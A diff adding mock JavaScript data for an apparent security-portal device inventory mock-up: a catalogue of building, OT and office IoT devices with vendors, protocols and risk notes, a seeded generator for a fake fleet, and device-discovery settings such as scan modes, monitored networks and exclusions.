+    note:'Cordless handset base for facilities staff.' },
+  { t:'Analog telephone adapter', tab:'iot', p:'ATA', sub:'10.20.2', n:{lan:2},
+    v:['Grandstream Networks','Cisco Systems'], os:['HT814 firmware 1.0.51','SPA112 firmware 1.4'],
+    pr:['SIP','RTP','HTTP'], ob:'Unsupported', rk:['Medium'], hv:0,
+    note:'Adapter keeping analogue lines (lift phone, fax) alive on the IP network.' },
+
+  // --- Facility / building management ---
+  { t:'Smart Facility', tab:'iot', p:'BMS', sub:'10.20.6', n:{bms:3},
+    v:['Tridium','Johnson Controls'], os:['Tridium Niagara 4.13','Metasys 12.0'],
+    pr:['BACnet','HTTP','Telnet'], ob:'Unsupported', rk:['High','Medium'], hv:0.5,
+    note:'Building management supervisor. OT asset — probe with care, remediate through facilities.' },
+  { t:'HVAC controller', tab:'iot', p:'HVAC', sub:'10.20.6', n:{bms:6},
+    v:['Honeywell','Trane Technologies','Carrier Corporation'], os:['Tridium Niagara 4.13','Tracer SC+ 5.2'],
+    pr:['BACnet','Modbus','HTTP'], ob:'Unsupported', rk:['Medium','High'], hv:0.3,
+    note:'Zone HVAC controller. Reachable over BACnet with no authentication in the protocol.' },
+  { t:'Chiller controller', tab:'iot', p:'CHLR', sub:'10.20.6', n:{bms:2},
+    v:['Carrier Corporation','Trane Technologies'], os:['CCN firmware 6.2','Tracer AdaptiView 5.1'],
+    pr:['BACnet','Modbus'], ob:'Unsupported', rk:['High'], hv:0.5,
+    note:'Chiller plant controller. Loss of cooling takes the data hall with it.' },
+  { t:'Boiler controller', tab:'iot', p:'BLR', sub:'10.20.6', n:{bms:1},
+    v:['Siemens'], os:['Climatix 10.5'], pr:['BACnet','Modbus'], ob:'Unsupported', rk:['Medium'], hv:0,
+    note:'Heating plant controller in the basement.' },
+  { t:'Air handling unit', tab:'iot', p:'AHU', sub:'10.20.6', n:{bms:4},
+    v:['Distech Controls','Johnson Controls'], os:['EC-BOS 4.13','FEC firmware 11.2'],
+    pr:['BACnet','Modbus'], ob:'Unsupported', rk:['Medium','Low'], hv:0,
+    note:'Air handling unit controller serving a floor.' },
+  { t:'VAV controller', tab:'iot', p:'VAV', sub:'10.20.6', n:{bms:8},
+    v:['Belimo','Distech Controls'], os:['VAV controller firmware 3.4','ECB-VAV 2.9'],
+    pr:['BACnet'], ob:'Unsupported', rk:['Low','Informational'], hv:0,
+    note:'Variable air volume box controller. Dozens exist per floor, all speaking BACnet.' },
+  { t:'Thermostat', tab:'iot', p:'TSTAT', sub:'10.20.6', n:{bms:6,lan:2},
+    v:['ecobee','Nest Labs','Honeywell'], os:['ecobee firmware 4.8','Nest firmware 6.2'],
+    pr:['HTTPS','mDNS','BACnet'], ob:'Unsupported', rk:['Low','Informational'], hv:0,
+    note:'Networked thermostat, several of them consumer models bought outside IT.' },
+  { t:'Lighting controller', tab:'iot', p:'LGT', sub:'10.20.6', n:{bms:5},
+    v:['Lutron Electronics','Signify (Philips)','Legrand'], os:['Quantum 3.4','Interact Pro 2.8'],
+    pr:['BACnet','HTTP','DALI'], ob:'Unsupported', rk:['Low'], hv:0,
+    note:'Floor lighting controller on the facility VLAN.' },
+  { t:'Lighting gateway', tab:'iot', p:'LGTGW', sub:'10.20.6', n:{bms:2},
+    v:['Signify (Philips)'], os:['Interact bridge 1.60'], pr:['HTTPS','mDNS','Zigbee'],
+    ob:'Unsupported', rk:['Medium'], hv:0,
+    note:'Bridges a Zigbee lighting mesh onto IP — a wireless network the SOC cannot see.' },
+  { t:'Window shade controller', tab:'iot', p:'SHADE', sub:'10.20.6', n:{bms:3},
+    v:['Somfy','Lutron Electronics'], os:['Animeo IP 2.3','Sivoia QS 4.1'], pr:['HTTP','BACnet'],
+    ob:'Unsupported', rk:['Informational'], hv:0,
+    note:'Automated blind controller tied to the daylight sensors.' },
+  { t:'Elevator controller', tab:'iot', p:'ELEV', sub:'10.20.6', n:{bms:2},
+    v:['KONE','Otis Elevator'], os:['KONE E-Link 4.2','Otis Compass 3.0'], pr:['Modbus','HTTP','SNMP'],
+    ob:'Unsupported', rk:['High'], hv:0.5,
+    note:'Lift controller with destination dispatch. Safety system — never actively probe it.' },
+  { t:'Fire alarm panel', tab:'iot', p:'FIRE', sub:'10.20.6', n:{bms:2},
+    v:['Simplex Grinnell','Notifier'], os:['Simplex 4100ES 3.11','NOTIFIER NFS2 28.0'],
+    pr:['BACnet','Modbus','SNMP'], ob:'Unsupported', rk:['High'], hv:1,
+    note:'Life-safety panel. High value and explicitly out of scope for active scanning.' },
+  { t:'Sprinkler monitor', tab:'iot', p:'SPRNK', sub:'10.20.6', n:{bms:1},
+    v:['Simplex Grinnell'], os:['Sprinkler supervisory 2.4'], pr:['Modbus','SNMP'], ob:'Unsupported', rk:['Medium'], hv:0.5,
+    note:'Supervises sprinkler flow and tamper switches.' },
+  { t:'Water leak sensor', tab:'iot', p:'LEAK', sub:'10.20.6', n:{bms:4},
+    v:['Sensata Technologies','Honeywell'], os:['Leak sensor firmware 1.9'], pr:['MQTT','BACnet'],
+    ob:'Unsupported', rk:['Informational'], hv:0,
+    note:'Under-floor leak detection in the data hall.' },
+  { t:'Environmental sensor', tab:'iot', p:'ENV', sub:'10.20.6', n:{bms:5,lan:2},
+    v:['Sensata Technologies','APC by Schneider Electric'], os:['NetBotz 5.7','Sensor gateway 2.2'],
+    pr:['SNMP','HTTPS','MQTT'], ob:'Unsupported', rk:['Low'], hv:0,
+    note:'Temperature and humidity sensor reporting into the facilities dashboard.' },
+  { t:'Air quality sensor', tab:'iot', p:'AQ', sub:'10.20.6', n:{bms:3},
+    v:['Siemens','Honeywell'], os:['AQ sensor firmware 2.1'], pr:['MQTT','BACnet'], ob:'Unsupported', rk:['Informational'], hv:0,
+    note:'CO2 and particulate sensor feeding ventilation demand control.' },
+  { t:'Occupancy sensor', tab:'iot', p:'OCC', sub:'10.20.6', n:{bms:6},
+    v:['Distech Controls','Signify (Philips)'], os:['Occupancy sensor firmware 1.7'], pr:['BACnet','Zigbee'],
+    ob:'Unsupported', rk:['Informational'], hv:0,
+    note:'Desk and room occupancy sensor. Movement data is personal data.' },
+  { t:'Badge reader', tab:'iot', p:'BADGE', sub:'10.20.6', n:{bms:8},
+    v:['HID Global','ASSA ABLOY'], os:['Embedded RTOS','Signo firmware 2.4'], pr:['OSDP','ARP','UDP'],
+    ob:'Insufficient info', rk:['Informational','Low'], hv:0,
+    note:'Door reader. Passive traffic only, so its classification is a best guess.' },
+  { t:'Door controller', tab:'iot', p:'DOOR', sub:'10.20.6', n:{bms:4},
+    v:['LenelS2','HID Global'], os:['LNL-X 6.7','VertX firmware 3.6'], pr:['OSDP','HTTPS','TCP'],
+    ob:'Unsupported', rk:['High'], hv:0.7,
+    note:'Access control panel that drives the door strikes for a floor. Physical access is at stake.' },
+  { t:'Smart lock', tab:'iot', p:'LOCK', sub:'10.20.6', n:{bms:3},
+    v:['ASSA ABLOY'], os:['Aperio firmware 4.2'], pr:['Zigbee','OSDP'], ob:'Unsupported', rk:['Medium'], hv:0,
+    note:'Wireless door lock hanging off the access-control hub.' },
+  { t:'Turnstile controller', tab:'iot', p:'TURN', sub:'10.20.6', n:{bms:2},
+    v:['LenelS2'], os:['Turnstile controller 2.8'], pr:['OSDP','TCP'], ob:'Unsupported', rk:['Medium'], hv:0.5,
+    note:'Lobby turnstile. The gate between visitor space and staff space.' },
+  { t:'Gate controller', tab:'iot', p:'GATE', sub:'10.20.6', n:{bms:1},
+    v:['HID Global'], os:['Barrier controller 1.9'], pr:['TCP','HTTP'], ob:'Unsupported', rk:['Low'], hv:0,
+    note:'Car park barrier controller.' },
+  { t:'Security alarm panel', tab:'iot', p:'ALRM', sub:'10.20.6', n:{bms:2},
+    v:['Bosch Security Systems','Honeywell'], os:['B Series firmware 3.10','Galaxy Dimension 6.9'],
+    pr:['TCP','SIA','HTTP'], ob:'Unsupported', rk:['High'], hv:0.5,
+    note:'Intruder alarm panel with a dialler path to the monitoring centre.' },
+  { t:'Duress button gateway', tab:'iot', p:'DURESS', sub:'10.20.6', n:{bms:1},
+    v:['LenelS2'], os:['Duress gateway 1.4'], pr:['TCP','MQTT'], ob:'Unsupported', rk:['Medium'], hv:0.5,
+    note:'Panic-button gateway for reception. Availability matters more than confidentiality here.' },
+
+  // --- Power and energy ---
+  { t:'UPS', tab:'iot', p:'UPS', sub:'10.20.1', n:{lan:8,bms:2,br:1},
+    v:['APC by Schneider Electric','Eaton','Vertiv'], os:['NMC3 2.5','Gigabit Network Card 3.0'],
+    pr:['SNMP','HTTPS','Modbus'], ob:'Unsupported', rk:['Medium','Low'], hv:0.2,
+    note:'Uninterruptible power supply with a network management card. It can shut servers down on command.' },
+  { t:'PDU', tab:'iot', p:'PDU', sub:'10.20.1', n:{lan:10},
+    v:['APC by Schneider Electric','Raritan','Eaton'], os:['Rack PDU 2G 6.9','PX3 4.0'],
+    pr:['SNMP','HTTPS','SSH'], ob:'Unsupported', rk:['Medium'], hv:0.3,
+    note:'Switched rack PDU. Outlet-level power control over the network.' },
+  { t:'Generator controller', tab:'iot', p:'GEN', sub:'10.20.6', n:{bms:1},
+    v:['Schneider Electric'], os:['Genset controller 3.6'], pr:['Modbus','SNMP'], ob:'Unsupported', rk:['High'], hv:1,
+    note:'Standby generator controller. Last line of power resilience for the site.' },
+  { t:'Transfer switch', tab:'iot', p:'ATS', sub:'10.20.6', n:{bms:1},
+    v:['Eaton'], os:['ATS controller 2.2'], pr:['Modbus','SNMP'], ob:'Unsupported', rk:['High'], hv:0.5,
+    note:'Automatic transfer switch between mains and generator feeds.' },
+  { t:'Energy meter', tab:'iot', p:'MTR', sub:'10.20.6', n:{bms:4},
+    v:['Schneider Electric','Siemens'], os:['PowerLogic ION 4.5','SENTRON PAC 2.4'],
+    pr:['Modbus','BACnet','HTTP'], ob:'Unsupported', rk:['Low'], hv:0,
+    note:'Sub-metering point feeding the energy dashboard.' },
+  { t:'Solar inverter', tab:'iot', p:'PV', sub:'10.20.6', n:{bms:2},
+    v:['SMA Solar Technology','Enphase Energy'], os:['Sunny Portal firmware 3.11','Envoy S 7.6'],
+    pr:['Modbus','HTTPS','mDNS'], ob:'Unsupported', rk:['Medium'], hv:0,
+    note:'Rooftop PV inverter with an outbound cloud management tunnel.' },
+  { t:'Battery storage controller', tab:'iot', p:'BESS', sub:'10.20.6', n:{bms:1},
+    v:['Tesla, Inc.'], os:['Powerpack controller 24.4'], pr:['Modbus','HTTPS'], ob:'Unsupported', rk:['Medium'], hv:0.5,
+    note:'Battery energy storage controller supporting the generator changeover.' },
+  { t:'EV charger', tab:'iot', p:'EVSE', sub:'10.20.6', n:{bms:4},
+    v:['ChargePoint','Tesla, Inc.'], os:['CT4000 firmware 5.11','Wall Connector 24.16'],
+    pr:['OCPP','HTTPS','WebSocket'], ob:'Unsupported', rk:['Medium','Low'], hv:0,
+    note:'Staff car park charger talking OCPP out to a vendor cloud.' },
+
+  // --- Workplace appliances ---
+  { t:'Vending machine', tab:'iot', p:'VEND', sub:'10.20.5', n:{lan:3},
+    v:['Espressif Inc.'], os:['Telemetry module 2.1'], pr:['MQTT','HTTP'], ob:'Unsupported', rk:['Low'], hv:0,
+    note:'Vending telemetry module added by the catering supplier, not by IT.' },
+  { t:'Coffee machine', tab:'iot', p:'BREW', sub:'10.20.5', n:{lan:2},
+    v:['Espressif Inc.'], os:['Connected appliance 1.4'], pr:['MQTT','mDNS'], ob:'Unsupported', rk:['Informational'], hv:0,
+    note:'Connected coffee machine in a break room. Classic shadow-IoT arrival.' },
+  { t:'Water dispenser', tab:'iot', p:'WATER', sub:'10.20.5', n:{lan:1},
+    v:['Espressif Inc.'], os:['Dispenser firmware 1.2'], pr:['MQTT'], ob:'Unsupported', rk:['Informational'], hv:0,
+    note:'Filtered water unit reporting cartridge life to the supplier.' },
+  { t:'Smart Appliance', tab:'iot', p:'APPL', sub:'10.20.5', n:{lan:2},
+    v:['Samsung Electronics','LG Electronics'], os:['Tizen 7.0','webOS 23'], pr:['SSDP','mDNS','HTTP'],
+    ob:'Unsupported', rk:['Low'], hv:0,
+    note:'Break-room appliance with a network stack nobody planned for.' },
+  { t:'Time clock', tab:'iot', p:'CLOCK', sub:'10.20.5', n:{lan:3,br:1},
+    v:['ASSA ABLOY','HID Global'], os:['Time terminal firmware 3.1'], pr:['HTTPS','NTP','OSDP'],
+    ob:'Unsupported', rk:['Medium'], hv:0,
+    note:'Staff clock-in terminal storing badge identifiers locally.' },
+  { t:'Room booking panel', tab:'iot', p:'ROOM', sub:'10.20.5', n:{lan:10},
+    v:['Crestron Electronics','Logitech'], os:['Crestron TSS 2.5','CollabOS 1.12'], pr:['HTTPS','mDNS','Exchange'],
+    ob:'Unsupported', rk:['Low'], hv:0,
+    note:'Door-side booking panel authenticated to a resource mailbox.' },
+  { t:'Wayfinding kiosk', tab:'iot', p:'WAYF', sub:'10.20.5', n:{lan:2},
+    v:['Elo Touch Solutions'], os:['Android 12 (AOSP)'], pr:['HTTPS','mDNS'], ob:'Unsupported', rk:['Low'], hv:0,
+    note:'Touch directory screen in the atrium.' },
+  { t:'Air purifier', tab:'iot', p:'PURE', sub:'10.20.5', n:{lan:2},
+    v:['Espressif Inc.'], os:['Purifier firmware 2.0'], pr:['MQTT','mDNS'], ob:'Unsupported', rk:['Informational'], hv:0,
+    note:'Networked air purifier on an office floor.' },
+  { t:'Robot vacuum', tab:'iot', p:'VAC', sub:'10.20.9', n:{wifi:1},
+    v:['Espressif Inc.'], os:['Cleaning robot 4.3'], pr:['MQTT','mDNS'], ob:'Unsupported', rk:['Low'], hv:0,
+    note:'Cleaning robot that maps the floor plan and uploads it to a vendor cloud.' },
+  { t:'Game console', tab:'iot', p:'CONSOLE', sub:'10.20.9', n:{wifi:2},
+    v:['Sony Corporation','Contoso Corporation'], os:['PlayStation 5 firmware 24.06','Xbox OS 10.0'],
+    pr:['UPnP','HTTPS','mDNS'], ob:'Unsupported', rk:['Low'], hv:0,
+    note:'Console in a recreation area. Shadow IT with an open UPnP stack.' },
+  { t:'Wearable', tab:'iot', p:'WEAR', sub:'10.20.9', n:{wifi:4},
+    v:['Apple, Inc.','Samsung Electronics'], os:['watchOS 10.5','Wear OS 4'], pr:['mDNS','HTTPS'],
+    ob:'Insufficient info', rk:['Informational'], hv:0,
+    note:'Personal smartwatch that joined corporate wireless with saved credentials.' },
+  { t:'Smart plug', tab:'iot', p:'PLUG', sub:'10.20.9', n:{wifi:3},
+    v:['Espressif Inc.'], os:['Tasmota 13.4','Vendor firmware 1.1'], pr:['MQTT','mDNS','HTTP'],
+    ob:'Unsupported', rk:['Medium'], hv:0,
+    note:'Consumer smart plug. Cheap firmware, permanent network presence.' },
+  { t:'Single-board computer', tab:'iot', p:'SBC', sub:'10.20.7', n:{lan:3},
+    v:['Raspberry Pi Foundation'], os:['Raspberry Pi OS 12','Ubuntu Server 22.04 LTS (arm64)'],
+    pr:['SSH','HTTP','mDNS','ARP'], ob:'Can be onboarded', rk:['High','Medium'], hv:0,
+    note:'Unsanctioned single-board computer with SSH exposed. Onboardable — or removable.' },
+
+  // --- Industrial / OT ---
+  { t:'PLC', tab:'iot', p:'PLC', sub:'10.20.6', n:{bms:6},
+    v:['Rockwell Automation','Siemens','OMRON Corporation'], os:['ControlLogix 34.011','SIMATIC S7-1500 2.9'],
+    pr:['EtherNet/IP','S7comm','Modbus'], ob:'Unsupported', rk:['High','Medium'], hv:0.6,
+    note:'Programmable logic controller running a physical process. Never probe it actively.' },
+  { t:'HMI panel', tab:'iot', p:'HMI', sub:'10.20.6', n:{bms:4},
+    v:['Rockwell Automation','Siemens','Advantech'], os:['PanelView Plus 7 firmware 12','WinCC Comfort 17'],
+    pr:['EtherNet/IP','VNC','HTTP'], ob:'Unsupported', rk:['High'], hv:0.4,
+    note:'Operator panel, often with an unauthenticated VNC service on the OT segment.' },
+  { t:'RTU', tab:'iot', p:'RTU', sub:'10.20.6', n:{bms:2},
+    v:['Schneider Electric','Phoenix Contact'], os:['SCADAPack 570 firmware 8.6'],
+    pr:['DNP3','Modbus'], ob:'Unsupported', rk:['High'], hv:0.5,
+    note:'Remote terminal unit polling field devices over DNP3.' },
+  { t:'Industrial gateway', tab:'iot', p:'IGW', sub:'10.20.6', n:{bms:3},
+    v:['Moxa Inc.','Advantech'], os:['MGate 5109 firmware 2.4','ECU-1251 firmware 1.8'],
+    pr:['Modbus','MQTT','HTTP'], ob:'Unsupported', rk:['High'], hv:0.5,
+    note:'IT/OT gateway bridging serial field buses to Ethernet. A crossing point worth watching.' },
+  { t:'Protocol converter', tab:'iot', p:'CONV', sub:'10.20.6', n:{bms:2},
+    v:['Phoenix Contact','Moxa Inc.'], os:['Converter firmware 3.2'], pr:['Modbus','BACnet','TCP'],
+    ob:'Unsupported', rk:['Medium'], hv:0,
+    note:'Translates BACnet to Modbus between the BMS and plant equipment.' },
+  { t:'Industrial robot', tab:'iot', p:'ROBOT', sub:'10.20.6', n:{bms:2},
+    v:['FANUC Corporation','KUKA Roboter'], os:['R-30iB Plus 9.40','KRC5 8.7'],
+    pr:['EtherNet/IP','FTP','HTTP'], ob:'Unsupported', rk:['High'], hv:0.5,
+    note:'Robot cell controller with an anonymous FTP service still enabled.' },
+  { t:'CNC machine', tab:'iot', p:'CNC', sub:'10.20.6', n:{bms:2},
+    v:['HAAS Automation','FANUC Corporation'], os:['Haas NGC 100.22','FANUC Series 31i'],
+    pr:['SMB','FTP','MTConnect'], ob:'Unsupported', rk:['High'], hv:0.5,
+    note:'Machine tool pulling programs from an SMB share with a shared credential.' },
+  { t:'Conveyor controller', tab:'iot', p:'CONV-CTL', sub:'10.20.6', n:{bms:2},
+    v:['Rockwell Automation','Beckhoff Automation'], os:['CompactLogix 33.011','TwinCAT 3.1'],
+    pr:['EtherNet/IP','EtherCAT'], ob:'Unsupported', rk:['Medium'], hv:0,
+    note:'Materials handling controller on the dispatch line.' },
+  { t:'Variable frequency drive', tab:'iot', p:'VFD', sub:'10.20.6', n:{bms:4},
+    v:['Rockwell Automation','Mitsubishi Electric','Siemens'], os:['PowerFlex 755 firmware 14','SINAMICS G120 4.7'],
+    pr:['EtherNet/IP','Modbus','PROFINET'], ob:'Unsupported', rk:['Medium'], hv:0,
+    note:'Motor drive addressable from the plant network. Speed commands are unauthenticated.' },
+  { t:'Machine vision camera', tab:'iot', p:'MVIS', sub:'10.20.6', n:{bms:2},
+    v:['OMRON Corporation','Beckhoff Automation'], os:['FH vision firmware 6.4'], pr:['GigE Vision','EtherNet/IP'],
+    ob:'Unsupported', rk:['Low'], hv:0,
+    note:'Inspection camera on the production line, not a surveillance camera.' },
+  { t:'Barcode scanner', tab:'iot', p:'SCAN', sub:'10.20.5', n:{lan:4},
+    v:['Zebra Technologies','Datalogic'], os:['Scanner firmware 4.9'], pr:['TCP','HTTP','ARP'],
+    ob:'Unsupported', rk:['Low'], hv:0,
+    note:'Fixed-mount scanner at a goods-in station.' },
+  { t:'RFID reader', tab:'iot', p:'RFID', sub:'10.20.5', n:{lan:3,bms:1},
+    v:['Zebra Technologies','HID Global'], os:['FX9600 firmware 3.9'], pr:['LLRP','HTTP','TCP'],
+    ob:'Unsupported', rk:['Medium'], hv:0,
+    note:'Asset-tracking RFID portal reader.' },
+  { t:'Weighing scale', tab:'iot', p:'SCALE', sub:'10.20.5', n:{lan:2},
+    v:['Mettler-Toledo'], os:['IND570 firmware 5.2'], pr:['TCP','FTP','HTTP'], ob:'Unsupported', rk:['Low'], hv:0,
+    note:'Networked bench scale feeding the despatch system.' },
+  { t:'Asset tracker gateway', tab:'iot', p:'TRACK', sub:'10.20.5', n:{lan:2},
+    v:['Advantech','Espressif Inc.'], os:['BLE gateway firmware 2.6'], pr:['MQTT','BLE','HTTPS'],
+    ob:'Unsupported', rk:['Low'], hv:0,
+    note:'Bluetooth tag gateway tracking equipment around the building.' },
+  { t:'Torque tool controller', tab:'iot', p:'TORQ', sub:'10.20.6', n:{bms:1},
+    v:['Beckhoff Automation'], os:['Tool controller 2.3'], pr:['EtherNet/IP','TCP'], ob:'Unsupported', rk:['Low'], hv:0,
+    note:'Assembly torque controller logging fastening results.' },
+  { t:'Test bench controller', tab:'iot', p:'BENCH', sub:'10.20.6', n:{bms:2},
+    v:['Advantech','Beckhoff Automation'], os:['Windows 10 IoT Enterprise LTSC','TwinCAT 3.1'],
+    pr:['SMB','TCP','HTTP'], ob:'Can be onboarded', rk:['Medium'], hv:0,
+    note:'Test rig PC running a Windows IoT build — this one can take a sensor.' },
+  { t:'Environmental chamber', tab:'iot', p:'CHAMB', sub:'10.20.6', n:{bms:1},
+    v:['Advantech'], os:['Chamber controller 1.8'], pr:['Modbus','HTTP'], ob:'Unsupported', rk:['Low'], hv:0,
+    note:'Temperature/humidity test chamber in the engineering lab.' },
+  { t:'Lab instrument', tab:'iot', p:'LABI', sub:'10.20.5', n:{lan:3},
+    v:['Fujitsu','Advantech'], os:['Windows 7 Embedded (instrument)','Instrument firmware 3.4'],
+    pr:['SMB','FTP','TCP'], ob:'Unsupported', rk:['High'], hv:0.3,
+    note:'Instrument controller pinned to an end-of-life Windows build by its vendor. Segment it.' },
+];
+
+// Deterministic PRNG (mulberry32) so the generated fleet is byte-identical on every load.
+function fleetRandom(seed) {
+  let a = seed >>> 0;
+  return function () {
+    a = (a + 0x6D2B79F5) >>> 0;
+    let t = Math.imul(a ^ (a >>> 15), 1 | a);
+    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
+    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
+  };
+}
+
+(function buildDiscoveredFleet() {
+  const rand = fleetRandom(0x5EED1A7);
+  const pick = arr => arr[Math.floor(rand() * arr.length)];
+  const NOW  = Date.parse('2026-06-28T15:00:00Z');
+  const DAY  = 864e5;
+
+  // Addresses are handed out sequentially per subnet and never collide with the
+  // hand-written devices above.
+  const used = new Set(DISCOVERED_DEVICES.map(d => d.ip).concat(DEVICES.map(d => d.ip)));
+  const cursor = {};
+  function nextIp(base) {
+    const [a, b, c0] = base.split('.').map(Number);
+    const state = cursor[base] || (cursor[base] = { c:c0, h:20 });
+    for (;;) {
+      if (state.h > 250) { state.h = 20; state.c += 1; }
+      const ip = `${a}.${b}.${state.c}.${state.h}`;
+      state.h += 1;
+      if (!used.has(ip)) { used.add(ip); return ip; }
+    }
+  }
+
+  const hex = () => Math.floor(rand() * 256).toString(16).toUpperCase().padStart(2, '0');
+  function macFor(vendor) {
+    const oui = FLEET_OUI[vendor] || '02-00-5E';
+    for (;;) {
+      const mac = `${oui}-${hex()}-${hex()}-${hex()}`;
+      if (!used.has(mac)) { used.add(mac); return mac; }
+    }
+  }
+
+  // Hostnames must stay unique across the whole estate — the hand-written devices
+  // already claim names like WLC-01 and WKS-01, so generated ones skip past them.
+  const takenNames = new Set(DISCOVERED_DEVICES.map(d => d.name).concat(DEVICES.map(d => d.name)));
+
+  const stamp = ms => new Date(Math.round(ms / 60000) * 60000).toISOString().replace('.000Z', 'Z');
+  const RECS = { High:[4, 9], Medium:[2, 6], Low:[0, 3], Informational:[0, 1] };
+
+  let serial = 500;
+  const fleet = [];
+
+  FLEET_CATALOG.forEach(entry => {
+    let seq = 0; // one running number per classification, so names never repeat across sites
+    Object.keys(FLEET_SITES).forEach(site => {
+      const count = (entry.n || {})[site] || 0;
+      const siteInfo = FLEET_SITES[site];
+      const base = site === 'lan' ? entry.sub : FLEET_SITE_SUBNET[site];
+
+      for (let i = 1; i <= count; i++) {
+        const vendor = pick(entry.v);
+        const risk   = pick(entry.rk);
+        const ip     = nextIp(base);
+
+        // Age: most assets have been on the network for a long time, a handful are new.
+        // Every so often force a brand-new device so the "last 7 days" card stays alive.
+        const fresh   = serial % 83 === 0;
+        const ageDays = fresh ? 1 + Math.floor(rand() * 6) : 20 + Math.round(950 * Math.pow(rand(), 0.6));
+        const firstSeen = NOW - ageDays * DAY;
+        // Most things reported in within the last couple of days; some have gone quiet.
+        const quietDays = rand() < 0.86 ? rand() * 2.5 : 3 + rand() * 24;
+        const lastSeen  = Math.max(firstSeen + 60000, NOW - quietDays * DAY);
+
+        const [lo, hi] = RECS[risk];
+        const highValue = rand() < (entry.hv || 0);
+
+        // The BMS/OT segment is excluded from active probing, so those assets are only
+        // ever seen passively. Network gear inside the SNMP scan scope is credentialed.
+        const source = site === 'bms' ? 'Basic'
+          : entry.tab === 'network' && base === '10.20.0' && rand() < 0.7 ? 'Authenticated scan'
+          : site === 'br' && entry.tab === 'network' && rand() < 0.25 ? 'Authenticated scan'
+          : rand() < 0.12 ? 'Basic' : 'Standard';
+
+        const onboarding = entry.ob === 'Can be onboarded' && rand() < 0.06 ? 'Insufficient info' : entry.ob;
+
+        const seen = [];
+        const nSeen = 1 + Math.floor(rand() * Math.min(3, siteInfo.seen.length));
+        while (seen.length < nSeen) {
+          const s = pick(siteInfo.seen);
+          if (!seen.includes(s)) seen.push(s);
+        }
+
+        // Unclassified devices have no hostname to learn — discovery lists them by address.
+        let name = ip;
+        if (entry.t !== 'Unknown') {
+          do { name = `${site === 'br' ? 'BR-' : ''}${entry.p}-${String(++seq).padStart(2, '0')}`; }
+          while (takenNames.has(name));
+        }
+        takenNames.add(name);
+
+        fleet.push({
+          id:`DD-${serial++}`, name, tab:entry.tab, type:entry.t, os:pick(entry.os),
+          ip, mac:macFor(vendor), vendor, network:siteInfo.network,
+          onboardingStatus:onboarding, discoverySource:source, riskLevel:risk,
+          firstSeen:stamp(firstSeen), lastSeen:stamp(lastSeen),
+          highValue, protocols:entry.pr.slice(), seenBy:seen,
+          recommendationCount: onboarding === 'Insufficient info' ? 0 : lo + Math.floor(rand() * (hi - lo + 1)),
+          note:entry.note,
+        });
+      }
+    });
+  });
+
+  DISCOVERED_DEVICES.push(...fleet);
+})();
+
+const DEVICE_INVENTORY_TABS = [
+  { key:'computers', label:'Endpoints' },
+  { key:'network',   label:'Network devices' },
+  { key:'iot',       label:'IoT devices' },
+];
+
+// Onboarding-status triage buckets used by the inventory filter chips.
+const ONBOARDING_STATUSES = ['Onboarded', 'Can be onboarded', 'Unsupported', 'Insufficient info'];
+
+// Inventory filter flyout. `field` names the row property each group filters on;
+// a group with no boxes checked imposes no constraint, and groups AND together.
+const INVENTORY_FILTER_GROUPS = [
+  { key:'health',       label:'Filters',            field:'healthStatus',     icon:'💚',
+    options:['Active', 'Inactive', 'Misconfigured'] },
+  { key:'onboarding',   label:'Onboarding status',  field:'onboardingStatus', icon:'📥',
+    options:ONBOARDING_STATUSES },
+  { key:'antivirus',    label:'Antivirus status',   field:'avStatus',         icon:'🛡',
+    options:['Disabled', 'Not updated', 'Unknown'] },
+  { key:'excluded',     label:'Excluded',           field:'excludedLabel',    icon:'🚫',
+    options:['No', 'Yes'] },
+  { key:'winVersion',   label:'Windows 10 versions', field:'winVersion',      icon:'🪟',
+    options:['1607','1703','1709','1803','1809','1903','1909','2004','20H2','21H1','21H2','22H2','Future'] },
+];
+
+const INVENTORY_RANGES = ['7 days', '30 days', '6 months'];
+
+// System > Settings > Device discovery
+const DEVICE_DISCOVERY_SETTINGS = {
+  mode:'Standard',
+  modes:[
+    { key:'Standard', label:'Standard discovery (recommended)',
+      summary:'Active scan. Uses discovery protocols and multicast queries, then actively probes observed devices for richer classification.',
+      detail:'Each unmanaged device is probed no more than about once every three weeks, generating under 50KB of traffic per attempt. Onboarded devices are never probed.',
+      scanner:'Signed PowerShell scanner scripts run from the Defender for Endpoint downloads folder on designated onboarded devices.' },
+    { key:'Basic', label:'Basic discovery',
+      summary:'Passive scan. Extracts device information from network traffic that onboarded devices already see. No probes are sent.',
+      detail:'Anything that talks to an onboarded device on a monitored network can still show up in the inventory — exclusions only apply to active scanning.',
+      scanner:'Passive collection only; no scanner scripts are executed.' },
+  ],
+  monitoredNetworks:[
+    { name:'CORP-LAN',   gateway:'10.20.0.1',  dhcp:'10.20.0.10', devices:412, state:'Monitored', reason:'Correlated as corporate: majority of clients report this network name, gateway, and DHCP server.' },
+    { name:'CORP-WIFI',  gateway:'10.20.9.1',  dhcp:'10.20.0.10', devices:96,  state:'Monitored', reason:'Correlated as corporate.' },
+    { name:'BMS-VLAN',   gateway:'10.20.6.1',  dhcp:'10.20.6.1',  devices:24,  state:'Monitored', reason:'Manually added to the monitored list — OT segment would otherwise be ignored.' },
+    { name:'BRANCH-LAN', gateway:'10.20.12.1', dhcp:'10.20.12.1', devices:18,  state:'Monitored', reason:'Correlated as corporate.' },
+    { name:'GUEST-WIFI', gateway:'192.168.50.1', dhcp:'192.168.50.1', devices:0, state:'Ignored', reason:'Classified non-corporate. Devices here are not discovered or listed.' },
+    { name:'HOME-NET-*', gateway:'(various)',  dhcp:'(various)',  devices:0,   state:'Ignored', reason:'Private networks are never listed or actively scanned.' },
+  ],
+  exclusions:[
+    { target:'10.20.6.0/24', kind:'Subnet',      reason:'BMS/OT segment — passive discovery only, no active probes against facility controllers.' },
+    { target:'10.20.4.15',   kind:'IP address',  reason:'Deception host. Probing it would generate false lure hits.' },
+    { target:'Tier-0',       kind:'Device group', reason:'Domain controllers excluded from acting as standard-discovery scanners.' },
+  ],
+  authenticatedScans:[
+    { name:'Core network — SNMP', scanner:'DC01', targets:'10.20.0.0/24', protocol:'SNMPv3 (read-only)', interval:'Every 4 hours', lastRun:'2026-06-28T14:00:00Z', found:3, state:'Active' },
+    { name:'Branch network — SNMP', scanner:'WKS-02', targets:'10.20.12.0/24', protocol:'SNMPv2 (read-only)', interval:'Daily', lastRun:'2026-06-27T02:00:00Z', found:1, state:'Paused' },
+  ],
+  enterpriseIoT:{ enabled:true, note:'Defender for IoT is onboarded in the portal, so IoT/OT assets are classified and appear on the IoT devices tab.' },
+};
+
